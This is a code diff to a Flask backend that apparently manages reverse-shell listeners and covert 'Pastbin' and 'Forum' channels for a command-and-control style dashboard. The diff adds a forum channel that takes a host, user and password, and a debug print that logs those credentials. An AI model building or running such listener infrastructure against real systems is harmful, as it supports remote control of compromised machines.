@@ -1,7 +1,7 @@
 from flask import request, jsonify, Blueprint, g
 import jwt
 from backend.app.jwt_handler import verify_token, token_required
-from backend.app.api.routes.dashboard.shell import Shell, Pastbin
+from backend.app.api.routes.dashboard.shell import Shell, Pastbin, Forum
 from backend.DB import get_db_connection
 
 
@@ -42,10 +42,17 @@ def terminal_command():
 @token_required
 def listener_command():
     data = request.get_json()
+    print(data)
     nom = data['nom']
+    ip = data['host']
     port = data['port']
     types = data['type']
+    user = data['user']
+    password = data['password']
     print(types)
+
+    user_info = g.user_data  # Données décodées du token
+    user_id = user_info["user_id"]
     if types == "reverse shell":
         shell_temp[nom] = Shell(port)
         print("nom :", nom)
@@ -53,8 +60,6 @@ def listener_command():
             instances[nom] = shell_temp[nom]
             del shell_temp[nom]
 
-            user_info = g.user_data  # Données décodées du token
-            user_id =user_info["user_id"]
 
             save_shell_to_db(user_id, nom, "shell")
 
@@ -66,9 +71,14 @@ def listener_command():
 
     elif types == "Pastbin":
         instances[nom] = Pastbin(nom)
-        user_info = g.user_data  # Données décodées du token
-        user_id = user_info["user_id"]
         save_shell_to_db(user_id, nom, "Pastbin")
+        print("nom :", nom)
+
+        return jsonify({"resulat": "sa fcontion"})
+
+    elif types == "forume":
+        instances[nom] = Forum(ip, port, user, password, nom)
+        save_shell_to_db(user_id, nom, "Forum")
         print("nom :", nom)
 
         return jsonify({"resulat": "sa fcontion"})
